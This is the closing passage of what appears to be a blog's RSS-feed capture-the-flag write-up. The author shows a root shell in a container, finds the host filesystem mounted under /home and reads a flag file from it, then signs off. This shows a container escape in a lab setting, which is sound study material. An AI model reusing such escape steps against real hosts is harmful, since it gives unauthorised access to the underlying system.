+&lt;pre&gt;&lt;code&gt;root@bec2ede58b0f:/# ls # This is the container file system
+bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
+root@bec2ede58b0f:/# cd /home
+root@bec2ede58b0f:/home# ls # This is the file system on the host!
+bin boot dev etc home initrd.img initrd.img.old lib lib64 lost+found media mnt opt proc root run sbin srv swapfile sys tmp usr var vmlinuz vmlinuz.old
+root@bec2ede58b0f:/home# cat root/flag.txt
+Do you think you are out?
+
+Just kidding, here is your flag: 1xcDF933mce
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And that&amp;rsquo;s that!  I hope you enjoyed reading this!  I&amp;rsquo;m certainly not and expert at pentesting, but I&amp;rsquo;m going to try and continue doing writeups of boxes that I&amp;rsquo;m successful at breaking into.&lt;/p&gt;
+</description>
+    </item>
+  </channel>
+</rss>
